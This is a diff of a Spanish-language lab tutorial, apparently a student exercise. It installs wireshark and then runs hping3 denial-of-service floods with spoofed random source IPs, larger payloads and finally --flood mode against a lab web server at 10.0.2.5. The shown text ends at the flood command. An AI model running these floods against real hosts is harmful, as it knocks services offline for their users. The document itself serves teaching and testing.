@@ -419,7 +419,65 @@ Ahora instalaremos la herramienta que necesitamos para dicho ataque (hping3) y u
 > Procesando disparadores para man-db (2.9.4-2) ...
 >
 > guillevr@atacante:~$
-
+> guillevr@atacante:~$ sudo apt-get install wireshark
+>
+> Leyendo lista de paquetes... Hecho
+>
+> Creando árbol de dependencias... Hecho
+>
+> Leyendo la información de estado... Hecho
+>
+> Se instalarán los siguientes paquetes adicionales:
+>
+>   libbcg729-0 libc-ares2 libdouble-conversion3 liblua5.2-0 libmd4c0
+>
+>   libminizip1 libpcre2-16-0 libqt5core5a libqt5dbus5 libqt5gui5
+>
+>   libqt5multimedia5 libqt5multimedia5-plugins libqt5multimediagsttools5
+>
+>   libqt5multimediawidgets5 libqt5network5 libqt5printsupport5 libqt5svg5
+>
+>   libqt5widgets5 libsmi2ldbl libsnappy1v5 libspandsp2 libssh-gcrypt-4
+>
+>   libwireshark-data libwireshark14 libwiretap11 libwsutil12 libxcb-xinerama0
+>
+>   libxcb-xinput0 qt5-gtk-platformtheme qttranslations5-l10n wireshark-common
+>
+>   wireshark-qt
+>
+> Paquetes sugeridos:
+>
+>   qt5-image-formats-plugins qtwayland5 snmp-mibs-downloader geoipupdate
+>
+>   geoip-database geoip-database-extra libjs-leaflet
+>
+>   libjs-leaflet.markercluster wireshark-doc
+>
+> Se instalarán los siguientes paquetes NUEVOS:
+>
+>   libbcg729-0 libc-ares2 libdouble-conversion3 liblua5.2-0 libmd4c0
+>
+>   libminizip1 libpcre2-16-0 libqt5core5a libqt5dbus5 libqt5gui5
+>
+>   libqt5multimedia5 libqt5multimedia5-plugins libqt5multimediagsttools5
+>
+>   libqt5multimediawidgets5 libqt5network5 libqt5printsupport5 libqt5svg5
+>
+>   libqt5widgets5 libsmi2ldbl libsnappy1v5 libspandsp2 libssh-gcrypt-4
+>
+>   libwireshark-data libwireshark14 libwiretap11 libwsutil12 libxcb-xinerama0
+>
+>   libxcb-xinput0 qt5-gtk-platformtheme qttranslations5-l10n wireshark
+>
+>   wireshark-common wireshark-qt
+>
+> 0 actualizados, 33 nuevos se instalarán, 0 para eliminar y 3 no actualizados.
+>
+> Se necesita descargar 34,0 MB de archivos.
+>
+> Se utilizarán 170 MB de espacio de disco adicional después de esta operación.
+>
+> ¿Desea continuar? [S/n] s
 
 ## Uso básico de Hping3.
 
@@ -440,3 +498,87 @@ El uso de esta herramienta es muy sencillo, pero disponemos de una gran cantidad
 * -z –bind enlaza ctrl+z a ttl (por defecto al puerto de destino)
 * -Z –unbind desenlaza ctrl+z
 * –beep beep por cada paquete recibido que coincida
+
+## Como realizar ataque DDOS.
+
+Para comprobar como funciona la herramienta Hping3 realizaremos varios ataques.
+
+El primer ataque que realizaremos será para ver como realiza las peticiones hping enviando paquetes de un tamaño de 54KB desde IPs aleatorias.
+
+Para ver los paquetes que envía el atacante, abriremos wireshark en la máquina ATACANTE:
+> guillevr@atacante:~$ sudo wireshark
+>
+> [sudo] contraseña para guillevr:
+>
+> 23:51:57.308     Main Warn QStandardPaths: XDG_RUNTIME_DIR not set, defaulting to '/tmp/runtime-root'
+
+Una vez abre wireshark, seleccionaremos la interfaz por la que queremos capturar el trafico. En mi caso se trata de la "enp0s3"
+
+# AÑADIR IMAGEN
+
+Como filtro añadiremos como IP de destino la IP del SERVIDOR.
+
+> ip.dst==10.0.2.5
+# AÑADIR IMAGEN
+
+Por otra parte, abriremos una ventana de comandos y escribiremos el siguiente comando:
+
+> hping3 --rand-source 10.0.2.5 -p 80
+
+Tras ejecutar dicho comando, veremos en wireshark el trafico que hay por la interfaz .Veremos todas las peticiones que se realizan al servidor y tambien podremos ver el tamaño de los paquetes si pinchamos en cada uno de ellos.
+
+> guillevr@atacante:~$ sudo hping3 --rand-source 10.0.2.5 -p 80
+>
+> [sudo] contraseña para guillevr:
+>
+> HPING 10.0.2.5 (enp0s3 10.0.2.5): NO FLAGS are set, 40 headers + 0 data bytes
+>
+> ^C
+>
+> --- 10.0.2.5 hping statistic ---
+>
+> 18 packets transmitted, 0 packets received, 100% packet loss
+>
+> round-trip min/avg/max = 0.0/0.0/0.0 ms
+
+# AÑADIR IMAGEN ATAQUE_1
+
+Como son peticiones con poco peso no tumbaremos el servidor.
+Para comprobar que sigue en funcionamiento el servidor, mientras seguimos enviando paquetes nos iremos a la maquina CLIENTE y realizaremos una peticion a la pagina web del servidor.
+
+# AÑADIR IMAGEN ATAQUE_1_1
+
+El segundo ataque lo realizaremos cambiando el tamaño de los paquetes y los paquetes que enviaremos por segundo.
+El comando que utilizaremos para ello es el siguiente:
+
+> hping3 --rand-source -d 500 10.0.2.5 -p 80 --faster
+
+Podremos comprobar con una captura de wireshark la cantidad de paquetes que se llegan a enviar pero aun así, no se llega a tumbar la web del SERVIDOR.
+
+# AÑADIR IMAGEN ATAQUE_2
+
+> guillevr@atacante:~$ sudo hping3 --rand-source -d 500 10.0.2.5 -p 80 --faster
+>
+> HPING 10.0.2.5 (enp0s3 10.0.2.5): NO FLAGS are set, 40 headers + 500 data bytes
+>
+> ^C
+>
+> --- 10.0.2.5 hping statistic ---
+>
+> 1001798 packets transmitted, 0 packets received, 100% packet loss
+>
+> round-trip min/avg/max = 0.0/0.0/0.0 ms
+>
+> guillevr@atacante:~$
+>
+
+
+Para volver a comprobarlo, mientras seguimos realizando el ataque, nos iremos al CLIENTE y volveremos a hacerle una peticion al SERVIDOR a traves de la página web.
+
+# AÑADIR IMAGEN ATAQUE_2_1
+
+El tercer ataque es el definitivo. Para ello, ejecutaremos el mismo comando que hemos utilizado anteriormente pero en modo **--flood**, el cual enía paquetes lo mas rapido posible pero no nos envia respuesta de si han llegado los paquetes.
+
+La sentencia del comando seria la siguiente:
+
+> sudo hping3 --rand-source -d 500 10.0.2.5 -p 80 --flood
